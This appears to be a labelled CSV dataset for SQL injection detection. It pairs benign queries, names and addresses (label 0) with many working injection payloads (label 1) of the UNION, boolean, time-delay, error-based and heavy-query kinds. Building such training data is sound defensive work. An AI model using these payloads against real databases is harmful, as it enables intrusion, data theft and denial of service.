Query,Label
choclo,0
SELECT leaf FROM atmosphere UNION ALL SELECT bring FROM grass ORDER BY spend,0
7aria22,0
antoine,0
meredith,0
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'xnap'  =  'xnap,1
vicari joan catany 123 1?c,0
abieldar,0
byoung,0
"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
59137152n,0
"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1
fuente de piedra,0
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"   SELECT suddenly, tropical, voyageFROM door WHERE tales  IS NOT NULL",0
"1'  )   as jiic where 6158  =  6158 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT MIN ( right )  AS wool FROM if,0
"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",1
SELECT * FROM riding WHERE firm = 'feet'  OR recall = 'may',0
"-5391 or make_set  (  9354  =  9354,7185  )  # ptyy",1
"1%"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1
"-4300""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""klbu""  =  ""klbu",1
SELECT Count ( * )  AS wish,0
FROM  ( SELECT DISTINCT uncle FROM nervous ) ,0
"-7887'  )   union all select 9049,9049,9049,9049,9049,9049,9049,9049,9049,9049#",1
SELECT COUNT ( forceID ) FROM itself,0
18120,0
1'  )   as cdrm where 4595  =  4595 order by 1#,1
7219,0
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'vmuj' like 'vmuj",1
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",1
dannies,0
SELECT father ( s FROM when RIGHT JOIN,0
"1'+  (  select jqyo where 4426  =  4426 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1
"masia ca l'angel 39,",0
"1%'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM kept WHERE also NOT LIKE '[primitive]%',0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1
acabadamente,0
cenheg,0
"1'+  (  select nvht where 9118  =  9118 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
-8652'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
SELECT slow FROM result UNION SELECT similar FROM function ORDER BY swing,0
SELECT ACOS ( -0.8 ) ;,0
"   SELECT service, simplest, pushFROM possibly WHERE cover  IS NOT NULL",0
SELECT adjective ( s )  FROM short FULL OUTER JOIN,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_4_link' LIMIT 1,0
canella,0
nikolia,0
SELECT * FROM path WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
1s,1
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""njdu"" like ""njdu",1
SELECT * FROM comfortable WHERE driven NOT LIKE '[read]%',0
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1
rastrilladora,0
"-6118 union all select 5906,5906,5906,5906,5906#",1
"  SELECT * FROM club WHERE cabin IN  ( 'chart', 'thread', 'carried' )  ",0
"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM measure WHERE burn = 'pretty' LIMIT 3,0
"   SELECT guide, wonder, brief FROM lift WHERE outline  IS NULL",0
youping,0
SELECT COUNT ( placeID ) FROM right,0
" select * from users where id  =  1 or ""  (  _"" or 1  =  1 -- 1",1
5230,0
meeks,0
-7707'   )    )    union all select 3172#,1
1'  )   and   (  7603  =  3634  )  *3634,1
" select * from users where id  =  1 union select !<@,version  (    )   -- 1",1
-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,1
"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
amorebieta-etxano,0
ech5d7,0
19119,0
"1"" where 8978  =  8978 union all select null,null,null,null,null,null,null,null--",1
1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',1
1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc",1
tottenham@satellites.py,0
 (  select   (  case when   (  9263  =  9263  )   then 1 else 9263*  (  select 9263 from mysql.db  )   end   )    ) ,1
14970,0
"-8902 union all select 4339,4339,4339#",1
SELECT AVG ( east )  FROM smell  SELECT SUM ( string ) ,0
SELECT * FROM never WHERE settle NOT LIKE 'organized%',0
"avenida de europa 153,",0
SELECT * FROM Customers  WHERE Country = 'Germany'  OR Country = 'Spain';,0
SELECT * FROM tree WHERE most BETWEEN '1996-07-01' AND '1996-07-31',0
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
"1%""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,1
3m6noja4,0
"  SELECT lionID AS ID, mouse AS own FROM stomach",0
-6215'  )   or   (  8459  =  8459  )  *4906,1
25186,0
SELECT * FROM box WHERE start = 'clock',0
 UPDATE replace SET smooth = 'instrument'WHERE rapidly = 'cream',0
" SELECT * FROM current ORDER BY planned, behavior",0
"-7691"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
SELECT COUNT ( DISTINCT him )  FROM thou,0
select   (  case when   (  3676  =  8635  )   then 3676 else 1/  (  select 0  )   end  )  --,1
SELECT * FROM ate,0
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1
SELECT * FROM recent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM settlers,0
"-5193 where 2175  =  2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",1
-4518 where 8023  =  8023 or 6872  =  6872--,1
select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,1
1   )    )    as qlkf where 6635  =  6635,1
"1""   )    )   ",1
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1
tramaced,0
" select * from users where id  =  1.*\ union select null,@@VERSION -- 1",1
1   )    )    as ehlg where 6340  =  6340,1
SELECT * FROM them WHERE silly NOT BETWEEN 'dozen' AND 'bottom',0
SELECT TOP 3 * FROM giant WHERE tomorrow = 'lunch' SELECT * FROM sudden,0
"1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"   SELECT Employees.connected, COUNT ( Orders.grownID )  AS flowerFROM    ( OrdersINNER JOIN middle ON Orders.cityID  =  Employees.remarkableID ) ",0
"SELECT * FROM operation WHERE stick BETWEEN ""generally"" AND    ""promised""",0
arcos de jaln,0
1'+  (  select snam where 1993  =  1993,1
cornisamen!to,0
SELECT ALL ProductName FROM Products WHERE TRUE;,0
SELECT COUNT ( usID ) FROM blind,0
rozaln del monte,0
10302390t,0
winifred5,0
"1   )    )    union all select null,null,null,null,null,null,null#",1
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1 where 1326  =  1326 union all select null,null,null,null,null,null--",1
"1"" where 1765  =  1765 union all select null,null,null,null,null,null#",1
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,0
SELECT TOP 50 PERCENT * FROM conversation,0
40979614p,0
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,1
"  SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID =  string.water ORDER BY first.strike",0
elder@parcalia.hn,0
pesquisar,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1
SELECT * FROM list,0
SELECT AVG ( temperature ) FROM available SELECT SUM ( stretch ) ,0
hiplita,0
#NAME?,0
SELECT tonight ( s )  FROM population FULL OUTER JOIN,0
"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,1
SELECT AVG ( oldest ) FROM send SELECT SUM ( solid ) ,0
SELECT TOP 50 PERCENT * FROM trap SELECT * FROM toy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tube,0
chalanera,0
"INSERT INTO depth ( class, stuck, particles, sister, type, bell )  VALUES  ( 'swam', 'sick'. whatever', 'pleasant', 'foot', 'yesterday', 'wrong' )  ",0
"-3364%""   )    )     )   union all select 5464--",1
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""pxix""  =  ""pxix",1
salustio,0
SELECT * FROM  ( SELECT doubt FROM detail ) ,0
"-4015"" where 2610  =  2610 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"INSERT INTO division  ( suggest, build, wire )  VALUES  ( 'triangle', 'stopped', 'would' )  ",0
argem grive,0
"c/ pedro guezala 192, 6?a",0
SELECT * FROM shot  WHERE break NOT LIKE '[plenty]%',0
SELECT COUNT ( grain ) FROM kept,0
" SELECT column_name ( s )  FROM swung,uncle",0
" select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",1
"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#",1
SELECT excitement ( s )  FROM lamp FULL OUTER JOIN,0
musson@ajuntamentdebarcelona20.pr,0
SELECT * FROM behind WHERE hat = 'dirt' LIMIT 3,0
SELECT * FROM also WHERE NOT research = 'system'  AND NOT basic = 'post',0
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1
rutledge,0
SELECT dream ( s )  FROM folks SELECT fewer ( s ) ,0
log9era,0
91309762s,0
1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,1
SELECT wash ( s )  FROM aloud UNION ALL,0
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLY,0
gerino,0
55119519l,0
pins turrubiartes,0
montvez zurita,0
1  )   where 4573  =  4573,1
84276481l,0
"calle las artes, 90,",0
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",1
SELECT DISTINCT compass FROM bell,0
SELECT * FROM made WHERE who = 'private'  OR driven = 'upper',0
"-4588"" union all select 4550,4550,4550,4550#",1
SELECT * FROM shout WHERE flame BETWEEN '1996-07-01' AND '1996-07-31',0
"1' and make_set  (  8403  =  8403,8899  )   and 'lnwe'  =  'lnwe",1
SELECT * FROM television WHERE yesterday NOT LIKE 'other%',0
"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
select   (  case when   (  3435  =  4011  )   then 1 else 3435*  (  select 3435 from master..sysdatabases  )   end  )  --,1
"-3498""   )    )    as xbvb where 2056  =  2056 union all select 2056,2056,2056,2056,2056,2056,2056--",1
1%'   )    )    waitfor delay '0:0:5' and    (    (   '%'  =  ',1
SELECT swam ( s )  FROM diagram UNION ALL,0
SELECT * FROM look WHERE were = 'possible' LIMIT 3,0
oestreic,0
"1""  )   where 5850  =  5850 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM pair WHERE identity NOT LIKE '[chain]%',0
"SELECT QUARTER ( ""2017-01-01 09:34:21"" ) ;",0
gunderso,0
1.02549E+15,0
bohord1r,0
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",1
"1""  )   where 5358  =  5358",1
37170,0
1%',1
SELECT * FROM know WHERE go = 'entirely',0
or ''  =  ',1
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM native FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM women WHERE bowl = 'near'  OR sea = 'ship',0
SELECT end ( s FROM stream RIGHT JOIN,0
kava_ivic@comercioenlacalle.info,0
obed9e3cia0,0
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( pick ) FROM stop,0
"  SELECT * FROM rhyme WHERE meal IN  ( 'tail', 'smooth', 'month' )  ",0
SELECT * FROM began,0
"1""   )    )     )   union all select null,null--",1
SELECT * FROM lunch ORDER BY policeman DESC,0
FROM  ( SELECT DISTINCT basket FROM usual ) ,0
SELECT MIN ( tales )  AS equally FROM program,0
SELECT * FROM society WHERE partly = 'pocket',0
-9847%'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  '%'  =  ',1
armelle,0
grueneic,0
empel6tarse,0
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,1
DELETE FROM cookies WHERE parallel = 'correctly',0
8011,0
"1   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
SELECT * FROM  ( SELECT rhythm FROM layers ) ,0
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",1
 UPDATE good SET trouble = 'relationship'WHERE electricity = 'excellent',0
17889538t,0
"   SELECT rhyme, fort+ ', ' + weigh+ ' ' + engineer+ ', ' + mad AS town  FROM honor",0
SELECT contain ( s )  FROM hurt SELECT chair ( s ) ,0
SELECT AVG ( root ) FROM fully SELECT SUM ( spread ) ,0
corb9ch4da,0
SELECT * FROM Customers  WHERE CustomerName LIKE 'a_%_%';,0
SELECT column_name ( s ) FROM table1LEFT JOIN,0
tait,0
SELECT AVG ( Price ) FROM noted,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",1
1'||  (  select 'yydv' from dual where 9639  =  9639,1
SELECT DISTINCT name FROM dance,0
"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
"1"" where 7158  =  7158",1
"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",1
"   SELECT Employees.smaller, COUNT ( Orders.noneID )  AS everybodyFROM    ( OrdersINNER JOIN house ON Orders.degreeID  =  Employees.warnID ) ",0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_label_2874' LIMIT 1,0
28%,1
"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558",1
"calle andres mellado, 83, 12-d",0
45643261z,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367678,299806,299807,367679,299808,80777,30322,80782,28561,262315,299804,30387,228217,367680,367681,367682,367683,367684,367685,367686,30220,262317,30380,80779,30384,30390,80780,290065,291072,320706 )  ORDER BY meta_id ASC",0
"SELECT * FROM announced WHERE health BETWEEN ""yourself"" AND    ""that""",0
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1
"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
"   SELECT Employees.furniture, COUNT ( Orders.otherID )  AS wellFROM    ( OrdersINNER JOIN judge ON Orders.spokenID  =  Employees.scienceID ) ",0
pu128,0
select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,1
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',0
SELECT TOP 50 PERCENT * FROM instance,0
76150645z,0
"INSERT INTO product  ( instant, spent, pig )  VALUES  ( 'sick', 'plates', 'anybody' )  ",0
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1
SELECT safe ( s )  FROM stranger,0
SELECT * FROM shall WHERE feel BETWEEN 'phrase' AND 'hope',0
"1'  )   where 6387  =  6387 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
47,0
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'our-family-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,0
"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT student FROM wore UNION SELECT sang FROM pour ORDER BY habit,0
SELECT TOP 3 * FROM page WHERE chest = 'author',0
cresta-da,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8679 )  ORDER BY meta_id ASC",0
p5li8e5i2,0
DELETE FROM shinning,0
"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1
"   SELECT apart, single, remarkable FROM fox WHERE activity  IS NULL",0
SELECT * FROM chain WHERE butter LIKE '%way%',0
1%'  )   rlike   (  select   (  case when   (  1210  =  8664  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',1
SELECT EXP ( 1 ) ;,0
"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",1
SELECT TOP 3 * FROM climate SELECT * FROM rate 3SELECT * FROM show,0
1.80E+15,0
SELECT COUNT ( DISTINCT cover )  FROM run,0
"1"" where 3764  =  3764",1
thorndik9,0
mario caraball,0
1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
aventino,0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
5229,0
atilio,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'efpc' like 'efpc",1
SELECT * FROM location WHERE stopped  BETWEEN 10 AND 20,0
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
quintino,0
SELECT scientist FROM purple UNION ALL SELECT period FROM industrial ORDER BY doll,0
-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,1
SELECT *FROM  ( SELECT column_name ( s )  FROM,0
SELECT option_value FROM wp_options WHERE option_name  =  'siteground_optimizer_combine_css' LIMIT 1,0
SELECT mice ( s )  FROM winter,0
thain,0
SELECT * FROM floating,0
"1"" or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""zyoo""  =  ""zyoo",1
"1'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  'uzxr'  =  'uzxr",1
manjarrs,0
"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'mvkg'  =  'mvkg",1
"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",1
"petxina, 77, 2b",0
SELECT AVG ( shape ) FROM man SELECT SUM ( jump ) ,0
1' waitfor delay '0:0:5'--,1
SELECT * FROM real ORDER BY parts,0
"-4280%""   )    )     )   union all select 7981,7981--",1
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,1
"1'+  (  select 'myrb' where 3622  =  3622 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1
-3100'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'etuj' like 'etuj,1
16966742x,0
SELECT option_value FROM wp_options WHERE option_name  =  '_houzez_property_status_2710' LIMIT 1,0
SELECT COUNT ( DISTINCT date )  FROM ground,0
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT * FROM weak WHERE smaller NOT BETWEEN 'unit' AND 'dear',0
"  SELECT Orders.roperID, Employees.pitch, Employees.grain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.headingID ORDER BY Orders.loveID",0
"-6431' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'ixix' like 'ixix",1
"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",1
"""  )   or true--",1
xixian,0
SELECT basis ( s )  FROM why UNION ALL,0
"1%"" union all select null,null,null#",1
SELECT * FROM evidence ORDER BY train DESC,0
"1%"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1""  )   where 3404  =  3404 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",1
"1'||  (  select 'nvrq' from dual where 4337  =  4337 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1
1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
SELECT * FROM noise FETCH FIRST 50 PERCENT ROWS ONLY,0
8.1203E+15,0
gomecello,0
PRINT @@variable,1
tiza,0
SELECT AVG ( base ) FROM note,0
"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",1
dowson@sehimaco.eg,0
